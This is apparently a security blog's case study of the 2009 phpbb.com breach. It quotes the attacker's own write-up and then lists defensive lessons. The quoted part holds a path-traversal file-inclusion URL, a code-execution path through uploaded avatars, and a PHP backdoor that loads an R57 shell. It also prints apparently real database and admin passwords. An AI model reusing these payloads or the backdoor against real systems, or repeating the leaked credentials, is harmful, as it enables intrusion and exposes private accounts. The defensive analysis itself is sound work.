@@ -1,0 +1,83 @@
+Security Archive – Case Study: phpbb.com Compromised
+
+Security Archive: It is important to remember past security incidents to make sure we don’t commit the same mistakes over and over again. The idea is to learn from our mistakes.
+You can read other case studies from our security archive here:
+
+Jan 31st, 2009 – PHPbb.com hacked – Security archive case study
+Jan 17th, 2008 – Perl.com hacked – Security archive case study
+May 5th, 2000 – Apache.org defaced – Security archive case study
+
+Jan 31st, 2009: The website for the popular open source bulletin board, phpbb.com, was compromised and the user list was posted online. That was scary news for anyone using phpBB as they were unsure what was going on. If we are not mistaken (it has been a few years), phpbb.com was actually offline for many days while their team investigated the issue.
+
+What happened?
+It’s not often that we can hear directly from the attackers what they did to compromise a site. However, the guy responsible for the phpBB compromise did a blog post releasing a plethora of details, succinctly outlining what and why he did it. (he posted it many years ago on a Blogspot address that is now offline).
+It’s long, but very interesting so give it a read, then ask yourself how susceptible are you to this type of attack?
+
+I hacked PHPBB.com
+It all started on Jan 14th when I was surfing milw0rm and came across this exploit: http://www.milw0rm.com/exploits/7778 I then remembered that phpbb.com was running PHPlist and went looking through my email to find the link to the script’s location. So I went to phpbb.com/lists and sure enough they were running a vulnerable version. Next I enabled my favorite program proxy program and tried:
+httx:// www.phpbb.com/ lists/admin/ index.php?_SERVER%5bConfigFile%5d=../ ../.. /../../ ../ etc/ passwd
+And sure enough it included the etc/passwd
+After a little looking I figured out that their forums were running off /home/virtual/phpbb.com/community/ well it has been known for some time that you can include code in the error log. So I wanted to run some code, well in PHPBB3 the avatars
+are located in a folder called /home/virtual/phpbb.com/community/images/avatars/upload and your avatar is called (secret hash)_userid.jpg.
+But I didn’t know what the secret has was to include my picture (that had my own code in it) so by using the error log I injected code and figured out that their hash is f51ee61fe7a83fdf72780912bced0855.
+So now every time I want to upload run code against the server I can
+include this:
+/../../  ../../../   ../home/virtual/ phpbb.com/community/ images/avatars/upload/f51ee61fe7a83fdf72780912bced0855_ID.jpg
+So my first avatar was something simple and I wanted to see if phpbb kept their config file in plain text so cat
+/home/virtual/phpbb.com/community/config.php and sure enough, its in plain text.
+$dbms = ‘mysqli’;
+$dbhost = ‘phpbb.db.osuosl.org’;
+$dbport = ”;
+$dbname = ‘phpbb’;
+$dbuser = ‘phpbb2’;
+$dbpasswd = ‘saxM9nfRjLbJ2Yy5’;
+$table_prefix = ‘community_’;
+While I was at it I checked out the config for PHPlist and it was also
+in plain text:
+$database_host = “localhost”;
+$database_name = “phpbb_phplist”;
+$database_user = ‘phplist’;
+$database_password = ‘Berti3_Danc3’;
+So I started running commands and found out that I can upload a php text file on the forums and by finding where the path it was stored I was able to get around their 14kb restrictions on avatars and a lot easier than editing images with edjpgcom. So doing a mysql dump of the phplist_admin table it showed in plain text that the password for the one admin account was phpbb_n3ws and the login was phpBB.
+Wow I am shocked no one brute forced this. So I login and see what I can come across, wow 400,000 registered emails, I’m sure that will go quick on the black market, sorry people but expect a lot of spam. After trying to modify the files that were stored in PHPlist I gave up and moved on to the forums.
+On the phpbb forums it states it has 200,000 members, but due to them constantly getting spammed they have well over 400,000 accounts. I started dumping the community_users table with their user_id, username and user_password. PHPBB stores their user’s passwords in unsalted md5 and their admin’s passwords in some funky hash.
+So I wrote a script that submits via curl, the md5 hash to a website
+and then stores the successful result in my own mysql database. The
+total accounts cracked are: 28635. I could have continued cracking but
+it was getting boring. Here is a sql file of the cracked passwords.
+In gaining access to the admin panel of the forums, I was able to read
+staff forums and come across some interesting posts. I will share some
+with you.
+Next I enabled php in template files and added this bit of code to one
+of the templates:
+$ip=$_SERVER["REMOTE_ADDR"]; if($ip ==
+“x.x.x.x”){include("/home/virtual/phpbb.com/community/files/(myid)_82ec9f9eb80df2a16cc3638429631c9f”);}
+Which happened to be a shell, R57shell actually. I then searched for a writable directory and created a php file and wrote the source code tothat file. I cleaned up the template and settings and logs and left the forums to run the way they were.
+After searching around using the shell I came across the Blog settings:
+define("DB_NAME", ‘wordpress’); // The name of the database
+define(‘DB_USER’, ‘blog’); // Your MySQL username
+define(‘DB_PASSWORD’, ‘htsCCvyCnt5jPYMx’); // …and password
+And now it comes to an end, you may ask why did I do this? For fun mainly, but what I would like to suggest to the team at phpbb is this. If you are going to run third party scripts, either integrate them or keep up to date on their patches. (even though the patch wasn’t released for 2 weeks).
+Also don’t allow admin’s to recover their passwords, they should have to contact another admin. Another item, doesn’t keep plain text files of passwords or in the database plain text passwords.
+
+Mistakes
+Anyone defending a server has a big disadvantage compared to the attackers. The defender can do everything right, but he if makes one mistake or forgets one script unpatched, that’s the one that will be abused.
+These were the mistakes by the phpbb team:
+
+They were using an unpatched (vulnerable) software called PHPlist. That’s what allowed them to be compromised in the first place.
+They didn’t have any log/web monitoring in place. The attacker was doing things like downloading the password file and not being blocked. Anyone looking at the logs would have catched it right away.
+No integrity monitoring. The attacker was able to modify template files and remain undetected.
+They were storing the passwords in the database hashed with the md5 algorithm, and not with a more secure password hashing method. That allowed the passwords to be cracked very easily.
+There was no notification system in place to notify the admins in case a password was reseted or modified.
+
+What do we learn from this and How to protect ourselves?
+As you can see, the phpbb team didn’t make what would categorized as a major mistake. In fact, their security was actually good compared to most servers we see today. How many of you really look at your logs and take time to set the proper permissions of your web files?
+In any event, the mistakes they did make were enough to be compromised. This is what we can do differently to protect ourselves:
+
+Keep your site updated! And it is not just your main CMS or plugins. But anything you have installed in there, from plugins to add-ons and themes. Look beyond the application and make sure you are applying the same due diligence to your web server.
+Do an inventory of everything you install. If you ever install something on your site, make sure to track it somewhere, to make sure you are always looking for updates and vulnerabilities to it. If you don’t know (or forgot) you had something installed, you are more likely to keep it outdated when a patch comes.
+Run a WAF on your site! The attack would have been prevented by a simple WAF. In fact, if the WAF had virtual patching, it would have blocked the initial vulnerability from being exploited in the first place.
+Enable notification and alerting whenever possible and available. If they had notifications in place, they would have received warnings when a password was reset. Or when a suspicious IP logged in via their admin panel.
+Store the passwords securely in the database. If you are a developer, do not use md5() or sha1() to store the passwords. You need to use a proper password hashing, like bcrypt.
+
+What do you think? What additional steps could be taken to avoid issues like what was described above?
